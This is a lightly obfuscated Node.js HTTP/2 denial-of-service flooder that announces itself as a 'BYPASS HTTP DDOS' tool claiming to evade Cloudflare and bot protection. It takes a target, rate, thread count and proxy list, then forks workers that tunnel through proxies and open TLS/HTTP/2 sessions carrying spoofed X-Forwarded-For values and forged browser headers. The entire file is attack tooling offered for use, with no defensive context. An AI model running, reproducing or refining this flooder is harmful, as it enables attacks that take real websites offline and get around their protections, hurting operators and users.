const net = require("net"),
  http2 = require("http2"),
  tls = require("tls"),
  cluster = require("cluster"),
  url = require("url"),
  fs = require("fs");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (_0x5857fe) {});
process.argv.length < 7 && (console.log("Usage: target time rate thread proxyfile"), process.exit());
const headers = {};
function readLines(_0x255acd) {
  return fs.readFileSync(_0x255acd, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x4ade62, _0x5241ad) {
  return Math.floor(Math.random() * (_0x5241ad - _0x4ade62) + _0x4ade62);
}
function randomElement(_0x326909) {
  return _0x326909[randomIntn(0, _0x326909.length)];
}
function randstr(_0xd940a6) {
  const _0x1e5bc2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let _0x1ccb4f = "";
  const _0x3a49ea = _0x1e5bc2.length;
  for (let _0x2b60b0 = 0; _0x2b60b0 < _0xd940a6; _0x2b60b0++) {
    _0x1ccb4f += _0x1e5bc2.charAt(Math.floor(Math.random() * _0x3a49ea));
  }
  return _0x1ccb4f;
}
function getRandomInt(_0x14c8e6, _0x164b6c) {
  return Math.floor(Math.random() * (_0x164b6c - _0x14c8e6 + 1)) + _0x14c8e6;
}
const ip_spoof = () => {
    const _0x5e21e6 = () => {
      return Math.floor(Math.random() * 255);
    };
    return _0x5e21e6() + "." + _0x5e21e6() + "." + _0x5e21e6() + "." + _0x5e21e6();
  },
  spoofed = ip_spoof(),
  ip_spoof2 = () => {
    const _0x1c4d2d = () => {
      return Math.floor(Math.random() * 9999);
    };
    return "" + _0x1c4d2d();
  },
  ip_spoof3 = () => {
    const _0x55d41d = () => {
      return Math.floor(Math.random() * 118);
    };
    return "" + _0x55d41d();
  },
  args = {
    "target": process.argv[2],
    "time": parseInt(process.argv[3]),
    "Rate": parseInt(process.argv[4]),
    "threads": parseInt(process.argv[5]),
    "proxyFile": process.argv[6]
  },
  sig = ["rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"],
  cplist = ["ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256"],
  val = {
    "NEl": JSON.stringify({
      "report_to": Math.random() < 0.5 ? "cf-nel" : "default",
      "max-age": Math.random() < 0.5 ? 604800 : 2561000,
      "include_subdomains": Math.random() < 0.5 ? true : false
    })
  },
  accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9", "text/html; charset=utf-8", "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"];
lang_header = ["ko-KR", "en-US", "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA", "en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA", "en-IN", "en-PH", "en-SG", "en-HK", "en-GB,en;q=0.8", "en-GB,en;q=0.9", " en-GB,en;q=0.7", "*", "en-US,en;q=0.5", "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "utf-8, iso-8859-1;q=0.5, *;q=0.1", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-GB, en-US, en;q=0.9", "de-AT, de-DE;q=0.9, en;q=0.5", "cs;q=0.5", "da, en-gb;q=0.8, en;q=0.7", "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9", "de-CH;q=0.7", "tr", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"];
const encoding_header = ["*", "*/*", "gzip", "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", "br", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip;q=1.0, identity; q=0.5, *;q=0", "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", "identity", "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", "deflate"],
  control_header = ["max-age=604800", "proxy-revalidate", "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", "s-maxage=604800", "max-stale", "public, immutable, max-age=31536000", "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", "max-age=31536000,public", "min-fresh", "private", "public", "s-maxage", "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", "no-transform", "max-age=31557600", "stale-if-error", "only-if-cached", "max-age=0"],
  platformd = ["Windows", "Linux", "Android", "iOS", "Mac OS", "iPadOS", "BlackBerry OS", "Firefox OS"],
  rdom2 = ["cloudflare is my dog", "Vietnam on top", "Kid website", "captcha is trash", "dont bully my http ddos", "client is hard", "0day script"];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))],
  accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))],
  lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))],
  encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))],
  proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target),
  rateHeaders = [{
    "A-IM": "Feed"
  }, {
    "accept": accept
  }, {
    "accept-charset": accept
  }, {
    "accept-datetime": accept
  }, {
    "viewport-height": "1080"
  }, {
    "viewport-width": "1920"
  }],
  rateHeaders2 = [{
    "Via": "1.1 " + parsedTarget.host
  }, {
    "X-Requested-With": "XMLHttpRequest"
  }, {
    "X-Forwarded-For": spoofed
  }, {
    "NEL": val
  }, {
    "dnt": "1"
  }, {
    "X-Vercel-Cache": randstr(15)
  }, {
    "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=86400"
  }, {
    "TK": "?"
  }, {
    "X-Frame-Options": "deny"
  }, {
    "X-ASP-NET": randstr(25)
  }, {
    "te": "trailers"
  }],
  rateHeaders4 = [{
    "accept-encoding": encoding
  }, {
    "accept-language": lang
  }, {
    "Refresh": "5"
  }, {
    "X-Content-duration": spoofed
  }, {
    "device-memory": "0.25"
  }, {
    "HTTP2-Setting": Math.random() < 0.5 ? "token64" : "token68"
  }, {
    "service-worker-navigation-preload": Math.random() < 0.5 ? "true" : "null"
  }],
  rateHeaders5 = [{
    "upgrade-insecure-requests": "1"
  }, {
    "Access-Control-Request-Method": "GET"
  }, {
    "Cache-Control": "no-cache"
  }, {
    "Content-Encoding": "gzip"
  }, {
    "content-type": "text/html"
  }, {
    "origin": "https://" + parsedTarget.host
  }, {
    "pragma": "no-cache"
  }, {
    "referer": "https://" + parsedTarget.host + "/"
  }],
  browserVersion = getRandomInt(125, 129),
  fwfw = ["Google Chrome", "Brave"],
  wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
let brandValue;
if (browserVersion === 125) brandValue = "\"Not_A Brand\";v=\"99\", \"Chromium\";v=\"" + browserVersion + "\", \"" + wfwf + "\";v=\"" + browserVersion + "\"";else {
  if (browserVersion === 126) brandValue = "\"Not A(Brand\";v=\"99\", \"" + wfwf + "\";v=\"" + browserVersion + "\", \"" + wfwf + "\";v=\"" + browserVersion + "\"";else {
    if (browserVersion === 127) brandValue = "\"Not A(Brand\";v=\"99\", \"" + wfwf + "\";v=\"" + browserVersion + "\", \"" + wfwf + "\";v=\"" + browserVersion + "\"";else {
      if (browserVersion === 128) brandValue = "\"Not A(Brand\";v=\"99\", \"" + wfwf + "\";v=\"" + browserVersion + "\", \"" + wfwf + "\";v=\"" + browserVersion + "\"";else browserVersion === 129 && (brandValue = "\"Not A(Brand\";v=\"99\", \"" + wfwf + "\";v=\"" + browserVersion + "\", \"" + wfwf + "\";v=\"" + browserVersion + "\"");
    }
  }
}
const isBrave = wfwf === "Brave",
  userAgent = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + browserVersion + ".0.0.0 Mobile Safari/537.36",
  secChUa = "" + brandValue;
if (cluster.isMaster) {
  console.log("[!] HTTP/2 | BYPASS HTTP DDOS".red);
  console.log("--------------------------------------------".gray);
  console.log("[>] Target: ".yellow + process.argv[2].cyan);
  console.log("[>] Time: ".magenta + process.argv[3].cyan);
  console.log("[>] Rate: ".blue + process.argv[4].cyan);
  console.log("[>] Thread(s): ".red + process.argv[5].cyan);
  console.log("Bypass UAM,CF-PRO,BotShield,...".cyan);
  console.log("Made by @ThaiDuongScript".cyan);
  console.log("--------------------------------------------".gray);
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else setInterval(runFlooder);
class NetSocket {
  constructor() {}
  async ["HTTP"](_0x5262d5, _0x19a587) {
    const _0x2372bd = _0x5262d5.address.split(":"),
      _0x18a886 = "CONNECT " + _0x5262d5.address + ":443 HTTP/1.1\r\nHost: " + _0x5262d5.address + ":443\r\nConnection: Keep-Alive\r\n\r\n",
      _0x23b72d = new Buffer.from(_0x18a886),
      _0x17211c = await net.connect({
        "host": _0x5262d5.host,
        "port": _0x5262d5.port
      });
    _0x17211c.setTimeout(_0x5262d5.timeout * 600000);
    _0x17211c.setKeepAlive(true, 100000);
    _0x17211c.on("connect", () => {
      _0x17211c.write(_0x23b72d);
    });
    _0x17211c.on("data", _0x5d6a89 => {
      const _0x55074e = _0x5d6a89.toString("utf-8"),
        _0xd3e74c = _0x55074e.includes("HTTP/1.1 200");
      if (_0xd3e74c === false) return _0x17211c.destroy(), _0x19a587(undefined, "error: invalid response from proxy server");
      return _0x19a587(_0x17211c, undefined);
    });
    _0x17211c.on("timeout", () => {
      return _0x17211c.destroy(), _0x19a587(undefined, "error: timeout exceeded");
    });
    _0x17211c.on("error", _0x4ffa7f => {
      return _0x17211c.destroy(), _0x19a587(undefined, "error: " + _0x4ffa7f);
    });
  }
}
const path = parsedTarget.path,
  Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers["x-forwarded-proto"] = "https";
headers[":path"] = path;
headers[":scheme"] = "https";
headers["upgrade-insecure-requests"] = "1";
headers["sec-ch-ua"] = secChUa;
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "none";
headers["sec-fetch-user"] = "1";
function runFlooder() {
  const _0x21c857 = randomElement(proxies),
    _0x27370d = _0x21c857.split(":"),
    _0x221558 = {
      "host": _0x27370d[0],
      "port": ~~_0x27370d[1],
      "address": parsedTarget.host + ":443",
      "timeout": 100
    };
  Socker.HTTP(_0x221558, async (_0x13abaa, _0x4577a8) => {
    if (_0x4577a8) return;
    _0x13abaa.setKeepAlive(true, 600000);
    const _0x25b5ac = {
        "rejectUnauthorized": false,
        "host": parsedTarget.host,
        "servername": parsedTarget.host,
        "socket": _0x13abaa,
        "ecdhCurve": "X25519",
        "ciphers": cipper,
        "secureProtocol": "TLS_method",
        "ALPNProtocols": ["h2"]
      },
      _0x226f99 = await tls.connect(443, parsedTarget.host, _0x25b5ac);
    _0x226f99.setKeepAlive(true, 60000);
    const _0x282e06 = await http2.connect(parsedTarget.href, {
      "protocol": "https:",
      "settings": {
        "headerTableSize": 4096,
        "maxConcurrentStreams": 100,
        "initialWindowSize": Math.random() < 0.5 ? 65536 : 65535,
        "maxHeaderListSize": 8192,
        "maxFrameSize": Math.random() < 0.5 ? 16777215 : 16384,
        "enablePush": false
      },
      "maxSessionMemory": 3333,
      "maxDeflateDynamicTableSize": 4294967295,
      "createConnection": () => _0x226f99,
      "socket": _0x13abaa
    });
    _0x282e06.settings({
      "headerTableSize": 4096,
      "maxConcurrentStreams": 100,
      "initialWindowSize": Math.random() < 0.5 ? 65536 : 65535,
      "maxHeaderListSize": 8192,
      "maxFrameSize": Math.random() < 0.5 ? 16777215 : 16384,
      "enablePush": false
    });
    _0x282e06.on("connect", () => {});
    _0x282e06.on("close", () => {
      _0x282e06.destroy();
      _0x13abaa.destroy();
      return;
    });
  });
  (function (_0x401173, _0x28d680, _0x8aa94c) {});
}
const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);